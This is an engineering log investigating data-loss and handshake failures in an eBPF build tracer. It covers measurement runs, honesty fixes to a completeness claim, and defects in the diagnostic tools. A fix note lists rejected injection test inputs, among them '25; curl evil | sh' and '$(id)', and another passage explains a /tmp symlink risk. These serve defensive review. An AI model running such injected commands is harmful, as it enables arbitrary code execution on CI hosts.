- `kernel_pending_insert_failed` **near 1113** → the map is the cause,
  and #1185 is a sizing-and-eviction bug.
- `kernel_pending_insert_failed` **0 with 1113 orphans** → the map is
  exonerated outright, every one of those 1113 is late arrival or
  ambient traffic, and the loss #1185 reports is somewhere else entirely.
- `pending_open_entries_at_close` says which of those two to expect
  before the counter does.

Either answer closes a question that four runs of controls could not,
which is the argument for the counter over another floor.

### #1185's honesty defect is now a deterministic reproduction

With the path corrected, the forced control reports:

```
completeness with a total capture loss: complete   (dropped=- reason=-)
```

A capture that observed **zero** file operations — every single open lost
— describes itself as `complete`, and names no drop and no reason. That
is #1185's report verbatim, and it is now reachable from one environment
variable instead of waiting for a nondeterministic loss to occur.

Nothing in this change makes it worse and nothing here fixes it; the
assertion is deliberately left as a print. The fix is the honest-claim
change (T038): a capture whose kernel drop slots are non-zero must not
claim `complete`. What this run adds is that the fix now has a test that
fails before it and passes after, which it did not have while the loss
was nondeterministic.

### A defect in this run's own instrument

The forced control first printed `completeness with a total capture loss:
absent`, read from `.predicate.trace_integrity.completeness`. That field
does not exist — the m210 check at the top of the same script reads
`.predicate.compiler_pipeline.completeness.state`. "Absent" reads as the
capture declining to claim completeness, which is the opposite of the
finding being demonstrated. Fixed to the real path, with `dropped` and
`reason` alongside. Recorded because a probe naming the wrong field
states something false with full confidence, and nothing about the output
looked wrong.

## Phase 3 — a protocol, a baseline, and a defect the protocol found

`measurements/baseline.sh`, committed so the table below can be re-run
rather than trusted. One fixture, one flag set, one field list, N runs,
min/median/max per field, and the per-run rows printed with the summary.

Host: Colima aarch64, 4 CPUs, kernel 6.8.0-136, `Dockerfile.ebpf-test`.

### The baseline, N=10

| field | min | median | max | distinct |
|---|---|---|---|---|
| elapsed_ms | 832 | 863 | 945 | 9 |
| file_operations | 102 | 102 | 102 | 1 |
| compiler_invocations | 9 | 9 | 9 | 1 |
| rustc_invocations | 7 | 7 | 7 | 1 |
| traced_subtree_opens | 1173 | 1173 | 1173 | 1 |
| outside_traced_subtree | 28 | 28 | 324 | 3 |
| unresolved_relative_opens | 5 | 5 | 5 | 1 |
| pending_open_entries_at_close | 0 | 0 | 0 | 1 |
| ring_buffer_overflows | 0 | 0 | 0 | 1 |
| open_failures_discarded | 599 | 599 | 599 | 1 |
| exit_without_request | 0 | 0 | 151 | 2 |

Set against the same feature a day earlier, where one identical control
reported 239 operations and then 415: everything the capture *reports* is
now stable, and the one field that still moves is
`outside_traced_subtree` — what the capture **declines**. The host's noise
left the measurement and became a counter about the host.

### What the protocol found immediately

The per-run rows, not the summary:

    outside_traced_subtree:  28 28 28 28 32 28 28 324 28 28
    exit_without_request:     0  0  0  0  0  0  0 151  0  0

Both outliers are the same run. The gate returns at syscall *entry* for an
out-of-subtree open, so no request is stored and the matching exit arrives
with nothing to join — **the gate was manufacturing orphans in the one
slot #1185 set out to make readable**. The same oversight was already
handled one branch above for the handshake marker, which would otherwise
have landed in `kernel_null_path` and broken the #618 control.

Three things had to be true to see it: repetition (nine of ten runs read a
clean `0`), a fixed command (so an outlier was not just a different
measurement), and the raw rows (the summary said `max 151`; only the rows
showed 151 and 324 in the *same* run, which is what named the mechanism).
The third existed only because the first N=10 run wrote its rows into a
`--rm` container and lost them.

### The fix, verified against forced load rather than luck

Waiting for an ambient burst is luck, so the control forces one — a
`find /usr -type f` loop outside the subtree, for the duration of the
trace:

| | declined | orphans | admitted | file_ops | invocations |
|---|---|---|---|---|---|
| forced load ×3 | 33928 / 32072 / 33130 | **0** | 1173 | 103 | 9 |
| quiet ×3 | 28 / 45 / 28 | **0** | 1173 | 102 / 103 / 102 | 9 |

~33,000 declined opens — a thousandfold over ambient — produce zero
orphans, where 324 produced 151 before the fix. `admitted` is unchanged at
1173 under both, so the build's capture is indifferent to host load, which
is the whole point of scoping it.

### A correction to the table above

`file_operations` is **102–103**, not 102. The N=10 run reported
`distinct: 1` and six further runs include three 103s. Ten runs were not
enough for that field, and the no-noise control establishes the extra
operation is not caused by the ambient load.

So the baseline's own stability column is itself a measurement with an N
attached, and quoting "deterministic" from it needs that N stated.
`traced_subtree_opens = 1173` has now held across 16 runs; `file_operations`
has not held across 16.

## Phase 5 — the claim

The decision was the maintainer's and it was to err on the side of caution:
claim less, and file issues for what cannot be supported yet.

### What was wrong with the claim

`CompilerPipelineData.completeness` is the one field a consumer reads to
decide whether the read and write sets are a total or a floor. It had three
inputs, and the only numeric one was dead:

```rust
// derive_completeness, before
if self.attach_late          { Partial { attach_late } }
if self.probe_attach_failed  { Partial { probe_attach_failed } }
if self.events_dropped > 0   { Degraded { .. } }      // always false
Complete
```

`record_events_dropped` is called from four unit tests and nowhere else;
`TraceStats.events_dropped` is the literal `0`, carrying the comment "Not
measured". So `Degraded` could not occur in a real trace, and `Complete`
was the default answer for every run that did not hit one of the two
`Partial` conditions — regardless of what the drop counters said.

This is why F10 held. The forced control refuses every single open, counts
them in `kernel_pending_insert_failed`, captures zero operations, and the
document says `complete`. The information was all there; nothing read it.

The sharpest form of it: `scan.rs` already logged the correct sentence —

> #618 observed events did not reach the recorded sets; the capture is a
> floor, not a total

— computed from `total_lost()`, and then wrote `complete` into the artifact
that gets signed. A log line goes to a terminal somebody may not be
watching. The attestation is the thing that travels.

### The exclusion was already written

`EventDropCounts::total_lost()` existed, with a doc comment arguing exactly
the distinction the claim needed: `kernel_outside_traced_subtree` counts
what the capture **declined**, not what it **lost**, and folding it in would
degrade every healthy scoped trace — "the false alarm that teaches people
to ignore the real one".

So the fix is three terms and no new judgement:

```
measured_loss = total_lost()                      // loss slots, scope excluded
              + ring_buffer_overflows             // kernel wrote, drain never saw
              + pending_open_entries_at_close     // still in flight at the end
```

fed to a `measured_loss` input kept **separate** from `events_dropped`.
Separate on purpose: `events_dropped` is #618's field and names one
specific mechanism. Overloading it would make a named field mean something
other than its name, which is the class of defect this whole phase is
about.

### What it costs, per the committed baseline

| field | N=10 median | contributes? |
|---|---|---|
| `ring_buffer_overflows` | 0 | yes, 0 |
| `pending_open_entries_at_close` | 0 | yes, 0 |
| the five kernel loss slots | 0 | yes, 0 |
| `outside_traced_subtree` | varies (28–33928) | **no — scope, not loss** |
| `open_failures_discarded` | 599 | no — not a drop reason |

So a healthy arm64 run still reports `complete`, and does so because every
loss counter reads zero rather than because nothing was consulted. That is
the difference the phase was for.

A run on the x86_64 lane, where `kernel_exit_without_request` has measured
~1113, now reports `degraded`. That is the honest answer and P6 is still
open on why the figure is what it is — but the document no longer has to
wait for P6 to stop overclaiming.

### A gap left visible rather than folded in

A loss counter that cannot be **read** still leaves the claim at
`complete`. The read failure lands in `counter_attach_failures`, which is
not an input to completeness. An unreadable counter is a reason not to
assert a total, and wiring that is its own change: `counter_attach_failures`
also carries failures of maps that have nothing to do with loss, so
degrading on any entry would be the same over-broad move the scope slot
exclusion exists to avoid.

### What was filed instead of fixed

Six issues, one per gap the Phase 4 inventory ranked, each stating in its
first lines whether its content is a measurement or a reading of the
source. The three that change what a record *means* rather than whether it
exists are the ones to take seriously:

- the `openat2` flags default of `0`, which is `O_RDONLY`, so a write is
  recorded as a read;
- the `ret` default of `-1`, which makes `open_failures_discarded` assert a
  failure nobody observed;
- the `dfd` default of `AT_FDCWD`, which converts an honestly `Unresolved`
  path into a confidently wrong `Resolved` one — routing around machinery
  that already declines correctly.

Plus the two groups of discarded map inserts (`PENDING_CHDIR` /
`PENDING_RENAME`, and the four in `compiler_exec.rs`), and the claim itself,
filed with its blast radius written down because the x86_64 consequence is
a visible change rather than a silent one.

None of the five substitution issues can quote a measurement, and each says
so. That is not a gap in the filing: the whole property of a
SILENT-SUBSTITUTION is that a run in which it fires is indistinguishable
from one in which it does not, so there is nothing to measure until a
counter exists. The order of work is counter, then forced control, then
measurement — the order `kernel_pending_insert_failed` went through.

---

## Run 7 — why the 7.0 x86_64 lane cannot establish its traced root

Open. Five hypotheses refuted, no cause yet, and one of my own controls
was invalid. Recorded because the refutations are the expensive part and
the next person should not re-pay for them.

Kernels: `6.8.0-136-generic aarch64` (Colima, handshake works) against
`7.0.0-1017-azure x86_64` (the lane, handshake never observed).

### What the lane reports

`TRACED_PIDS is empty` after the 2s wait, so the capture refuses to
trace. Before #1313 the same lane failed later, on
`libsafe/src/lib.rs is in no rustc read set` -- #1185's own symptom. The
guard is doing its job; the handshake underneath it is not.

### Refuted, each by measurement rather than argument

1. **Attach ordering / a missing program.** `All probes attached` at
   `03:10:10.604446`, `Spawning traced command` at `.604522` -- 78us
   earlier, no attach failure.
2. **Argument offsets.** `tracepoint-inventory.sh` run on x86_64 for the
   first time (the gap this document listed as outstanding):
   `dfd`@16, `filename`@24, `flags`@32, `ret`@16, identical to arm64 and
   to what `open_syscalls.rs` hardcodes. All nine open-family
   tracepoints PRESENT. Control held -- `rename` reads PRESENT here and
   ABSENT on arm64, so the probe read this kernel.
3. **A NULL filename.** 7.0 *does* add
   `__data_loc char[] __filename_val` @48 to `sys_enter_openat`, absent
   on 6.8, so the tracepoint now copies the filename into the record.
   Passing a valid empty-string pointer changed nothing. The kernel
   difference is real; the inference from it was wrong.
4. **A zero-extended `dfd`.** `low32_only=0`: no open arrived with the
   sentinel's low 32 bits and a differing upper 32.
5. **`dfd` validated before the tracepoint fires.** Both markers issued
   from one `pre_exec` -- the invalid-`dfd` original and a
   nonce-in-`flags` variant with a valid `AT_FDCWD`. Both unobserved
   (`sentinel_dfd_seen=0`, `nonce_in_flags=0`), so rejecting the call
   early is not it either.

### Established

- `sys_enter_openat` fires on this kernel: 466, 99, 45, 20, 18 openats
  across runs.
- The nonce is armed and reads back intact after the failure.
- Seeding is never attempted: `recognised=0`, `traced_insert_failed=0`.
- `pre_exec` **does** run, proven without eBPF -- the closure creates
  `/tmp/wb-pre-exec-ran` by raw syscall and userspace stats it:
  `pre_exec_ran=yes`. So the marker syscalls execute.
- And they are not observed. That is the whole remaining question.

### The invalid control, named

Slot 7 counted "opens from a pid that is not the tracer" via
`should_trace()`, intending to test whether the probe sees any process
but itself. It reported `non_tracer_opens == openat_entered` exactly
(18 of 18, 20 of 20), which looks like a clean answer and is not one:
`should_trace` compares `cfg.tracer_pid` to `current_pid()`, and the
tracer's pid is the namespaced one while the kernel's is the
init-namespace one. They cannot match in a container. **This is the
mismatch the handshake exists to work around**, documented in
`cli/scan.rs` as "what silently disabled the tracer-exclusion filter in
every containerised run" -- and the control was built on top of it. It
measures a tautology, so the unifying hypothesis below is untested, not
supported.

### The hypothesis worth testing next

The x86_64 capture has been short since before #1313: 29 file operations
against 102 on arm64, not one `.rs` read in the recorded list, every
instrumented site denying it. If the probe does not observe the traced
child's syscalls at all, that is the handshake failure and the missing
read sets as **one** fault.

Test it by amplitude, not by identity, since identity is what the
invalid control got wrong: have `pre_exec` issue N identical openats and
read `openat_entered`. Baseline is 18-20. If issuing 50 leaves it at
18-20 the child's opens are invisible; if it reaches ~68 they are seen
and only the markers are not, which nothing yet explains.

### What is already worth keeping, cause or no cause

- The failure now describes itself. Aborting before the attestation left
  every drop counter unreadable, `kernel_traced_insert_failed` included
  -- the one covering the seeding path. Two rounds were spent on that
  before the diagnosis moved into the error.
- `HANDSHAKE_DIAG` is deliberately not slots in `EVENT_DROPS`: that map
  now feeds `measured_loss`, so a diagnostic counted there would be
  reported as lost capture.
- The eBPF lane did not watch `waybill-cli/src/cli/scan.rs` or
  `waybill-common/src/{maps,events,filter,ip}.rs`. It could skip inside
  a run reporting success while the trace orchestration and the
  kernel/userspace ABI changed under it.
- `open_syscalls.rs` claimed its offsets were "measured against every
  tracepoint this module attaches to". True of arm64 only until run 7.

## Run 12 — the x86_64 handshake is intermittent, not absent

Found while reconciling #1322 against the tree, by reading `main`'s own
eBPF lane logs rather than the probe branch's. It contradicts two things
run 7 and #1322 both asserted.

### What the lane actually did

`main` at `9880eb77`, run `41161815084`, container harness, kernel
`7.0.0-1017-azure` x86_64. Three traces across two harness attempts:

| # | trace | result |
|---|---|---|
| 1 | `#1185 control` (attempt 1) | **root established** — attestation emitted, `event_drop_reasons {"kernel_outside_traced_subtree":21}`, `file operations 4`, `unresolved_relative 0` |
| 2 | `#1185 scope` (attempt 1) | failed: `TRACED_PIDS is empty` |
| 3 | `#1185 control` (attempt 2) | failed: `TRACED_PIDS is empty` |

One of three established its traced root. The first and third are the
*same probe with the same command*, 16 seconds apart in the same
container, and they disagree.

### Two claims this refutes, both mine

**"The traced root never announces itself on x86_64."** It announced
itself in trace 1. Run 7 generalised "never" from runs that all failed,
and that set did not include a success it could have. The honest
statement is **intermittent**, with N=3 in one run — which is not enough
to characterise a rate, only enough to kill "never".

**"#1313 traded a wrong x86_64 capture for no x86_64 capture."**
Unsupported. The harness order changed: the `#1185` control and scope
probes now run *before* the m210 fixture trace, and the scope probe's
abort ends the harness, so **the m210 trace is never reached**. At
`2f9be2e6` the m210 trace ran, emitted an attestation and captured 7
rustc invocations, failing later on `m1070 SC-001`
(`libsafe/src/lib.rs is in no rustc read set`). Post-#1313 there is no
evidence either way about m210 capture on x86_64, because nothing runs
it. "No capture" described the harness aborting early, not the capture
failing.

### What this does to the next test

The amplitude test recorded in run 7 — issue N identical openats from
`pre_exec` and watch `openat_entered` move — was designed for a probe
that never sees the child. For a handshake that works one time in three
it answers the wrong question: a null result would be indistinguishable
from having drawn two failures.

The question is now **what differs between a trace that establishes its
root and one that does not**, and the first candidate is timing, because
the bail is a 2s timeout. Two things to measure, in order:

1. **Rate, before mechanism.** Run the control probe N≥20 times in one
   container and count establishments. Without a rate, any fix is
   unfalsifiable: a change that does nothing passes two runs out of
   three.
2. **What the clock says.** The log already carries `All probes
   attached` → `Spawning traced command` → `Child started`, and in trace
   1 that span was 2.4ms. Instrument the nonce write and the first
   `is_handshake` call against the same clock and compare an
   establishing trace with a failing one.

Note the uprobe attach in this run took **2.47s** (`Attaching uprobes to
libssl` 03:10:08.131 → `All probes attached` 03:10:10.604), against a
2s handshake timeout. That is not yet a cause — attach completes before
the child is spawned, so ordering is not violated — but it is the only
measured quantity in the trace that is the same order of magnitude as
the timeout, and it is the first thing to rule in or out.

### Why this is in the list

#1322 records ten measurements that read as results and were not. This
is the eleventh, and it is the same shape as the slot-7 control: a
property asserted from a sample that could not establish it. "Never"
needed one counter-example and the counter-example was sitting in
`main`'s own CI log the whole time, unread, because the diagnosis was
being run on the probe branch.

## The twelfth: the `pre_exec_ran` marker could not have answered its question

Removed before landing, not after. The diagnostic wrote
`/tmp/wb-pre-exec-ran` from the child's `pre_exec` and stat'd it from the
tracer, to separate "the closure did not run" from "the probe did not see
it". Three defects, and the first alone is disqualifying:

**It is sticky-positive and never removed.** The harness runs three
traces per attempt. Once any one of them creates the file, every later
trace in that container reads `pre_exec_ran=yes` whether its own closure
ran or not. Run 12's table is exactly that shape — trace 1 established
its root, traces 2 and 3 did not — so in the single run this instrument
was built to explain, two of its three readings were the first trace's
answer repeated. It is the same failure the slot-7 control had, and the
same failure this whole document catalogues: a value that reads as a
measurement and is a leftover.

**It is a root-owned open of a predictable path in a world-writable
directory.** Tracing needs privileges, so the opener is typically root,
and `O_CREAT | O_WRONLY` follows symlinks: a pre-planted
`/tmp/wb-pre-exec-ran -> <anything>` is opened for writing by that root
process. Nothing is written through the handle, so the blast radius is
small, but a privileged process opening an attacker-chosen path is not a
shape to ship, and it also lets anyone on the host set the diagnostic's
answer.

**It is an unconditional side-effect of every trace.** `handshake_nonce`
is `Some` for every command-execute trace, with no probe flag gating it,
so a released binary would touch `/tmp` on every `waybill trace`.

The question it asked is still a good one, and `HANDSHAKE_DIAG` cannot
answer it: every slot in that map is written by a BPF program, so a
kernel that never raises the tracepoint and a child whose closure never
ran both read as zero. **The instrument for it is a `pipe2(O_CLOEXEC)`
opened before the spawn**: `write()` of one byte in the closure is
async-signal-safe and allocation-free, the parent's non-blocking read
answers "did it run", the child's end closes at `exec`, and the whole
thing is per-trace by construction — no path, no privilege, no staleness,
nothing to clean up. It is not built here because it cannot be compiled
in the configuration where it runs from this host, and shipping untested
`unsafe` fd plumbing to answer a diagnostic question is how this branch
got its `#[cfg]` defect in the first place.

## Run 13 — the diagnostic's first real output, and what it eliminates

PR #1321, run `41335262367`, `Lint + test (linux-x86_64, --features
ebpf-tracing)`, kernel `7.0.0-1017-azure`. Two traces, both failed to
establish, and `describe_handshake_failure` printed for each:

| slot | trace A | trace B |
|---|---|---|
| `openat_entered` | **135** | **79** |
| `sentinel_dfd_seen` | 0 | 0 |
| `nonce_in_flags` | **0** | **0** |
| `nonce_rejected` | 0 | 0 |
| `recognised` | 0 | 0 |
| `low32_only` | 0 | 0 |
| `odd_negative_dfd` | 0 | 0 |
| `traced_insert_failed` | 0 | 0 |
| `nonce_readback` | 1974713396 | 1355945307 |

### What is now established

**The entry program runs.** 135 and 79 openats reached it. "The
tracepoint does not fire on this kernel" is dead.

**The nonce is armed and readable.** Both read-backs are non-zero,
differ per trace, and sit inside `[0x40000000, 0x7FFFFFFF]` — the range
the loader's forced bit 30 produces. Neither the arming nor the
userspace read is the break.

**Neither marker arrived.** This is the finding. The branch issues two:
the original with an invalid `dfd` and the nonce in `flags`, and the new
one with `AT_FDCWD` and the nonce in `flags`. `sentinel_dfd_seen` and
`nonce_in_flags` are both zero. The two differ in `dfd` *and* the second
depends on neither the kernel accepting the call nor on how `dfd`
arrives — so **no encoding of either can explain both being absent**.

That eliminates, in one run, every hypothesis this branch was built on:
the NULL filename, the 7.0 `__filename_val` field, `dfd` validation
ordering, and `dfd` arriving zero-extended (`low32_only` = 0,
`odd_negative_dfd` = 0 — no negative `dfd` other than `AT_FDCWD`
appeared at all). The question is no longer how the marker is encoded.
It is why the child's pre-exec openats are not observed while 135 other
opens are.

### What it does NOT establish

A rate. These are two draws from a distribution run 12 measured at
roughly one establishment in three, and both are failures — which is the
outcome run 12 predicted would be indistinguishable from a real
negative. **Run 12's ordering stands: rate before mechanism.** Two more
failures with sharper counters is not the N≥20 that would make any of
this falsifiable.

### One correction to the instrument, from its own first run

The reading chain fell through to "no open carried the sentinel `dfd`:
either the marker syscall never reached this tracepoint, or the `dfd`
does not arrive as written" — offering two possibilities when
`nonce_in_flags=0`, printed on the same line, had already eliminated the
second. The instrument had the data to narrow and did not use it. Fixed:
`sentinel == 0 && nonce_in_flags == 0 && entered != 0` is now its own
branch and says that no encoding can explain it.

`non_tracer_opens` equals `openat_entered` in both traces and means less
than it appears to: `should_trace()` is false only for the tracer's own
pid, and the marker is issued by the forked child, whose pid differs —
so the child's opens are counted as "non-tracer" too. The slot is
labelled `[invalid-control]` in the output for that reason and should be
read as "the tracer process itself did no openat in the window", which
is unremarkable. Recorded because the equality is suggestive and wrong.

## The instrument for run 14, built before the run

Runs 12 and 13 both ended at the same place: *rate before mechanism*. The
reason is not methodological tidiness. At roughly one establishment in
three, a change that does nothing passes two runs out of three, so every
experiment on this handshake — including run 13's, which drew two
failures — is unfalsifiable until the denominator exists.

`scripts/ebpf-handshake-rate.sh` plus
`.github/workflows/handshake-rate.yml` is that denominator.

**Why it cannot be gathered by pushing N times.** Every push is a fresh
runner with its own image and its own timing, so N pushes measure N
environments once each. Run 12's own counter-example came from two traces
*in one container* disagreeing 16 seconds apart. The rate has to come
from one container, which is why this is a loop inside the harness image
rather than a trigger.

**What one run reports.** For N iterations (default 25):

- establishments, as a count and a percentage. A zero exit from `trace
  capture` *is* an establishment, because the fail-closed guard returns
  non-zero when `TRACED_PIDS` is empty — so the count needs no log
  parsing to be trustworthy.
- the per-iteration duration in milliseconds, split by outcome. Run 12
  named timing as the first candidate cause and recorded a 2.47s uprobe
  attach against a 2s handshake timeout: the only measured quantity in
  that trace of the same order as the bail. Establishment-versus-duration
  falls out of the same loop for free, so measurement 2 in run 12's list
  arrives with measurement 1 rather than after it.
- the failure diagnoses grouped by counter shape, with `nonce_readback`
  normalised out since it varies per trace by construction. Grouped
  rather than listed because 25 near-identical lines hide whether they
  are in fact identical, and a *second* shape appearing is more
  informative than any single line.

**It asserts no threshold and exits 0 whatever it finds.** No rate has
been measured, so there is nothing to assert against (CLAUDE.md, "measure
external behaviour before designing around it"), and a zero rate is a
result rather than a probe failure. Making a low rate an error would mean
the only runs that report are the ones that already worked.

What it *does* assert is its own denominator: it prints
`handshake-rate: iterations=N attempted=N established=k` and fails if
`attempted != N`, because a loop that exited early and a loop that ran to
completion with zero establishments otherwise print the same zeroes. The
workflow greps for that line and for the rate line, so a job that built
an image and never looped cannot pass.

**Triggered by `probe/**` pushes narrowed to four paths, and
deliberately not the image's `ENTRYPOINT`.** The probe is invoked by
overriding the entrypoint, so the eBPF CI lane that depends on this image
cannot be altered by adding a measurement to it.

The trigger took a correction. It was written `workflow_dispatch`-only,
because the job rebuilds the image (~10 minutes) before running N
privileged traces and has no business on a broad push trigger. That made
it **unrunnable**: GitHub registers a workflow for dispatch only from the
default branch, so a dispatch-only file on a feature branch does not
appear in `/actions/workflows` at all — checked there, which listed
`tracepoint-inventory.yml` and not this file. An instrument that cannot
be invoked until it merges is not an instrument, and it is why
`tracepoint-inventory.yml` is push-triggered too. The `paths` filter
keeps the cost where it belongs: the probe, the runner script, the
workflow and the Dockerfile, all of which change deliberately and
rarely.

The same check caught a second defect in the same place: `inputs.*` is
empty on a `push` event, so the deadline would have expanded to
`timeout "" docker wait` and failed. The defaults now live in the
expression (`${{ inputs.deadline_seconds || '600' }}`) rather than only
in the dispatch form, where they are unreachable from a push.

### Two incidental corrections, from building it

`Dockerfile.ebpf-test` claimed `.dockerignore` excludes `scripts/` from
its bulk `COPY . .`, so that editing an assertion script would not
invalidate the ~10-minute cargo-build layer. `scripts/` has never been in
`.dockerignore`, so the optimisation never happened. Not "fixed":
`.dockerignore` filters the build *context*, so excluding `scripts/`
would make the explicit `COPY scripts/...` lines fail outright, and a
negation exception puts the files back in the context where the bulk COPY
picks them up again. Making the claim true needs the bulk COPY to name
its paths or use BuildKit's `COPY --exclude`, which is a change to a
cached 10-minute build that no measurement here calls for. The comment
now describes what happens.

`scripts/ebpf-container-run.sh` gained an optional entrypoint argument
rather than a second copy of its deadline-and-diagnostics logic. Its
empty-array expansion is written `${a[@]+"${a[@]}"}` because under
`set -u` the bare form is an unbound-variable error before bash 4.4 and
the script is reachable from a macOS host whose `/bin/bash` is 3.2 —
measured both ways, not assumed.

### A third correction to the instrument, this one from a reviewer

Kusari Inspector failed PR #1321 on the rate workflow and was right.
The step interpolated `${{ inputs.deadline_seconds }}`,
`${{ inputs.iterations }}` and `${{ github.ref }}` straight into `run:`
shell blocks — a template-injection path in a job that **builds and runs
a privileged container**, so an injected command would execute with that
container's reach. Dispatch requires write access, which bounds the
exposure, and does not make it acceptable: the repository already routes
values through `env:` for exactly this reason at `ci.yml:804-808` and in
the m896 canary, and this workflow simply did not follow a pattern that
was already written down two files away.

Fixed by passing them through `env:` and referencing them quoted, plus
validation, since the values are not merely untrusted strings but a
`timeout` argument and a loop bound: non-numeric input would fail
obscurely inside the probe and an unbounded one would hold a runner
indefinitely. Both bounds are reasoned rather than guessed — 500 traces
at ~10s each already exceeds any deadline the job accepts. Checked
against nine cases including `25; curl evil | sh`, `$(id)`, empty, zero,
negative and leading whitespace; all rejected, the defaults accepted.

Inspector also named a hardening gap in `tracepoint-inventory.yml`, the
other workflow this branch adds: its checkout left credentials in the
local git config. A probe needs none, so `persist-credentials: false`.

Worth recording for what it says about the review loop rather than the
defect. Three of this instrument's four defects were found by asking a
question other than "does it look right": *can it be invoked* found two,
and an external analyser found this one. Reading the file again found
none of them.

## Run 14 — the rate, and what it does to the timing candidate

PR #1321, workflow `handshake establishment rate (x86_64)`, run
`41345243372`, commit `7a45f9f1`, kernel 7.0 x86_64. 25 traces of
`trace capture -- cat /etc/hostname` in **one** container.

```
handshake-rate: iterations=25 attempted=25 established=9
handshake-rate: 9/25 established = 36.0%
```

**The denominator exists.** 36% against run 12's one-in-three from N=3.
Mechanisms are falsifiable from here: a fix has to move 36% by more than
the spread of a 25-trace sample, and the two-of-three pass that run 12
warned about is no longer available to a change that does nothing.

### The duration split, and why it is not the cause

```
established: min=3289ms median=3311ms max=3351ms n=9
failed:      min=3307ms median=5272ms max=5359ms n=16
```

Establishments are extraordinarily tight — a 62ms spread across nine
traces. Failures sit about 1961ms above them at the median, and **1961ms
is the 2s handshake timeout**. A failing trace does the same ~3.3s of
work as a succeeding one and then spends the bail.

So the duration difference is a *consequence* of failure, not evidence of
a cause, and run 12's timing candidate is weaker than when it was
proposed: the 2.47s uprobe attach it flagged against a 2s timeout would
have to show up as a difference in the non-waiting work, and there is
none — 3289..3351ms whether the handshake lands or not. Recorded as a
candidate ruled *down*, not out: the attach happens before the child
spawns in both cases, so this measurement cannot see a race inside it.

This is the second measurement from run 12's list, answered alongside the
first, and it answered in the unwelcome direction. Worth stating plainly,
because the attractive reading of a 2s gap is that it is the 2s attach.

### Three failure shapes, which is the informative part

Grouped, 15 diagnosed failures:

| shape | n | what it says |
|---|---|---|
| `NEITHER marker arrived`, `openat_entered` non-zero | 14 | run 13's finding, reproduced 14 times |
| `openat_entered=0` — "`sys_enter_openat` did not fire at all" | 1 | the entry program never ran in that trace |
| no diagnosis line emitted at all, and it failed in **3307ms** | 1 | iteration 5: a failure that did not consume the timeout |

The last two are new. Iteration 5 failed in establishment-like time with
no diagnosis, so it did not reach the handshake wait — a different
failure path from the other fifteen, and one the diagnostic does not
describe. Iteration 21 saw *zero* machine-wide opens.

### The new lead: `openat_entered` spans 0 to 378

Across the 15 diagnosed failures:

```
    seen      0 open(s): 1 trace     seen     35 open(s): 1 trace
    seen      3 open(s): 1 trace     seen     36 open(s): 1 trace
    seen     11 open(s): 1 trace     seen     38 open(s): 1 trace
    seen     17 open(s): 1 trace     seen    114 open(s): 1 trace
    seen     18 open(s): 2 traces    seen    377 open(s): 1 trace
    seen     30 open(s): 1 trace     seen    378 open(s): 1 trace
    seen     33 open(s): 2 traces
```

This counter is incremented **ungated, as the entry program's first
statement, for every `openat` on the machine**. A trace that observed 3
opens — or 0 — during a ~3.3s window on a CI runner did not observe a
quiet machine; it observed almost none of one that cannot have been that
quiet. A 100× spread across otherwise identical traces says the program's
*live window* varies, not that the marker is encoded wrongly.

That is a different class of hypothesis from everything tried on this
branch, and it fits the intermittency naturally: a race between the
attach becoming effective and the child's pre-exec openats, which are
issued microseconds after `spawn()`. It also fits run 13's finding rather
than competing with it — if the program is not yet live, neither marker
can arrive, whatever either is encoded as.

**Alternatives not excluded**, because this is one run's inference and
the counter is read once at the end: a partial per-CPU read, a counter
lost to the same mechanism under investigation, or the read racing
detachment. The next instrument should timestamp the first
`increment_handshake_diag` against the nonce write and the spawn, which
is run 12's measurement 2 asked properly — of the *program's* clock
rather than the trace's.

### Two defects in the instrument, from its own first run

Both in the grouping, and both the same class as the thing it was built
to avoid.

**It grouped nothing.** 13 groups for 15 failures, because
`openat_entered` and `non_tracer_opens` vary per trace by construction
and were left in the grouping key — so every failure became its own
group, which is exactly the "25 near-identical lines hide whether they
are identical" problem the grouping exists to solve. Their spread is a
finding, as above; their presence in a key is noise. Normalised, and
reported separately.

**Every count was exactly 2×.** The diagnosis is emitted twice per
failure, once as the ERROR log and once inside the `Error:` message, and
the grouping counted matches rather than files. 4+4+2×11 = 30 for 15
diagnosed failures. One line per log file now.

Neither changes a number above — the rate, the durations and the shapes
were all recoverable from the per-iteration lines — but a reader who
trusted the distribution block would have concluded the failures were all
distinct, which is the opposite of what they are.

## Run 15 — the rate is stable, and the 2s gap is definitively the timeout

Run `41346561754`, commit `ba929b96`, same workflow, same N, a different
runner. Fired automatically by the push that changed the probe, which is
what the `paths` filter is for.

```
handshake-rate: iterations=25 attempted=25 established=8
handshake-rate: 8/25 established = 32.0%
```

**32% against run 14's 36%.** Nine establishments then eight, out of 25
each. **Combined: 17/50 = 34%.** Two samples is not a confidence
interval, but the denominator is stable enough to measure a fix against,
which is the property that was missing.

### The gap is the timeout, and now there is a control for it

```
run 14   established median=3311ms   failed median=5272ms   gap=1961ms
run 15   established median=2753ms   failed median=4733ms   gap=1980ms
```

The absolute durations moved by ~550ms between the two runners — a 17%
difference in machine speed — while **the gap moved by 19ms**, staying
within 2% of the 2s handshake timeout. A property that survives a change
in the thing it would depend on if it were machine-related is no longer
an inference. Run 14 read the gap as the timeout; run 15 supplies the
control that makes it a measurement.

Which settles run 12's timing candidate as far as this instrument can:
failing traces do the same work as succeeding ones and then spend the
bail. The 2.47s uprobe attach is not visible here in either direction.

### The prediction, and what it was tested against

Stated before the run, so it could fail: the rate lands near 36%, and the
fixed grouping collapses to two or three rows instead of thirteen.

Both held. 32%, and:

```
     15 #1185 handshake diagnosis -- openat_entered=<varies> ... NEITHER marker arrived
      2 #1185 handshake diagnosis -- openat_entered=<varies> ... slot 0 is zero
```

Two rows for 17 failures, counts no longer doubled. The two `slot 0`
failures are the two traces that saw **zero** machine-wide opens.

### The lead reproduces, harder

`openat_entered` across the 17 failures:

```
    0, 0, 1, 4, 11, 14, 14, 16, 18, 20, 20, 30, 30, 34, 99, 189, 218
```

Two traces at zero and one at **one**. A single machine-wide `openat`
observed across a 2.75s window on a CI runner is not a quiet machine; it
is a program that was live for a sliver of its own trace. Run 14 spanned
0..378 and run 15 spans 0..218, both with the mass down at the low end
and a few outliers two orders of magnitude above. The live-window
hypothesis survives a second sample.

### A third instrument defect: a fallback that stated something false

Both summary blocks printed their empty-case message *underneath their
own output*:

```
     15 #1185 handshake diagnosis -- ...
      2 #1185 handshake diagnosis -- ...
    (none — every iteration established)
```

…beneath a list of seventeen failures, in a run where eight of 25
established. The cause is `set -o pipefail` plus the inner
`grep -o … | head -1`, which exits 1 for the one log with no diagnosis
line and makes the whole pipeline non-zero — so `pipeline || echo` fires
on a pipeline that produced perfectly good output.

